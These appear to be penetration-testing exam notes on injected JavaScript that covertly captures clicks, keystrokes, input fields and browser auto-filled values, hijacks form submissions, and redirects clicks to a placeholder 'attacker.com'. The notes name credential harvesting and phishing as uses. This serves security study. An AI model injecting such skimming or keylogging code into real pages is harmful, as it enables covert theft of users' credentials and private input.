## JavaScript for Pentesters — Social Engineering via JavaScript

## Objective
Use JavaScript to:
- Capture user interactions
- Collect sensitive input
- Monitor behavior in real time

Think: *“What can I capture from user actions without them noticing?”*

---

## 1. Capture All Clicks

### Goal
Log or redirect all user clicks

---

### Example

```javascript
document.addEventListener('click', function(e) {
  console.log('Clicked:', e.target);
});
```

---

### Capture clicked URLs

```javascript
document.addEventListener('click', function(e) {
  if (e.target.tagName === 'A') {
    console.log('Link:', e.target.href);
  }
});
```

---

### Redirect clicks

```javascript
document.addEventListener('click', function(e) {
  e.preventDefault();
  window.location = 'https://attacker.com';
});
```

---

## 2. Keystroke Logging

### Goal
Capture user input from keyboard

---

### Example

```javascript
document.addEventListener('keydown', function(e) {
  console.log(e.key);
});
```

---

### Capture full input fields

```javascript
document.querySelectorAll('input').forEach(input => {
  input.addEventListener('input', function() {
    console.log(this.value);
  });
});
```

---

## 3. Event Listener (Core Concept)

### Common Events

| Event     | Trigger                  |
|-----------|--------------------------|
| click     | Mouse click              |
| keydown   | Key pressed              |
| input     | Field updated            |
| submit    | Form submitted           |
| change    | Value changed            |

---

### Generic listener

```javascript
element.addEventListener('event', function(e) {
  // action
});
```

---

### Example: form submission

```javascript
document.querySelector('form').addEventListener('submit', function(e) {
  console.log('Form submitted');
});
```

---

## 4. Stealing from Auto-Complete

### Goal
Capture values auto-filled by browser

---

### Method

- Browser auto-fills fields
- JavaScript reads values afterward

---

### Example

```javascript
window.addEventListener('load', function() {
  document.querySelectorAll('input').forEach(input => {
    if (input.value) {
      console.log(input.name, input.value);
    }
  });
});
```

---

### Delayed capture (more reliable)

```javascript
setTimeout(() => {
  document.querySelectorAll('input').forEach(input => {
    if (input.value) {
      console.log(input.name, input.value);
    }
  });
}, 3000);
```

---

## 5. Combining Techniques

### Example: capture + form hijack

```javascript
document.querySelector('form').addEventListener('submit', function(e) {
  e.preventDefault();
  const data = new FormData(this);
  console.log([...data.entries()]);
  this.submit();
});
```

---

## 6. Indicators / Use Cases

- Credential harvesting
- Session data capture
- Behavioral tracking
- Phishing enhancement

---

## 7. Fast Workflow (Exam Mode)

1. Inject or execute JS
2. Add listeners:
   - click
   - keydown
   - input
   - submit
3. Capture:
   - keystrokes
   - form data
4. Optionally:
   - redirect
   - modify behavior
5. Confirm data capture

---

## 8. Mental Model

User interacts → Events triggered  
Events → JavaScript captures  

If you control JS:
→ You see what the user does  
→ You capture what the user types